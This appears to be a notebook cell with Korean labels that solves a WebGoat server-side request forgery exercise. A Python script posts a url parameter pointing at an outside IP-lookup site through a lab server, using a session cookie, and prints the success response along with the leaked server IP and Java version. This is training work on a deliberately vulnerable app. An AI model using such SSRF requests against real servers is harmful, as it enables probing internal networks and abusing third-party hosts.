# %%
# 3번

# %%
import requests

target_url = "http://172.16.28.100:8081/WebGoat/SSRF/task2"


headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Cookie": "JSESSIONID=Yvhb-0L_Djn2vosGDOCoIdcX0U56zl1oeFgGOaiC" 
}

payload = {
    "url": "http://ifconfig.pro"
}

try:
    
    response = requests.post(target_url, data=payload, headers=headers)
    
    print(f"상태 코드: {response.status_code}")
    print("=")
    print(response.text) 

except Exception as e:
    print(f"에러 발생: {e}")
# Out:
# 상태 코드: 200
# =
# {
#   "lessonCompleted" : true,
#   "feedback" : "You rocked the SSRF!",
#   "output" : "<title> IP: 183.98.149.177 info<\\/title><br><br><pre><br><!-- <a href=http:\\/\\/6.ifconfig.pro>force ipv6<\\/a> <a href=\\\"http:\\/\\/[2605:2700:0:5::4713:95c5]\\/\\\">6 no dns<\\/a> | <a  href=http:\\/\\/4.ifconfig.pro>force ipv4<\\/a> --><br>IP:             183.98.149.177<br>HOSTNAME:       No dns record for host<br>USER_AGNET:     Java\\/17.0.17<br>LANGUAGE:       <br>ENCODINGS:      <br><hr><br>Feature list:<br><br>$curl ifconfig.pro<br>1.1.1.1<br><br>$curl ifconfig.pro\\/ip.host<br>1.1.1.1 r.d.ns.look.up<br><br>$curl ifconfig.pro\\/host<br>r.dns.look.up<br><br>$curl ifconfig.pro\\/help<br>this help file<br><br>now ipv6 ready!<br>to force ipv6 use 6.ifconfig.pro<br>to force ipv4 use 4.ifconfig.pro<br><br><br><!-- end --><br><br><hr><br><!-- referral links: <a href=\\\"http:\\/\\/www.linode.com\\/?r=657ce52d44839e1e764b5e514f74daf2825a98c0\\\">Linode - Xen VPS Hosting<\\/a> | <a href=http:\\/\\/www.geekstorage.com\\/aff\\/319>GeekStorage - WebHosting For Geeks, By Geeks<\\/a> | <a href=\\\"http:\\/\\/www.namecheap.com\\/?aff=22484\\\">Namecheap.com domains<\\/a> --><br>If you would like to keep ifconfig.pro running: cashapp $jbphoto221  | or donate via <a href=https:\\/\\/jbphotome.square.site\\/product\\/ifconfigpro\\/18?cp=true&sa=true&sbp=true&q=false>Square (jbphoto)<\\/a>",
#   "assignment" : "SSRFTask2",
#   "attemptWasMade" : true
# }
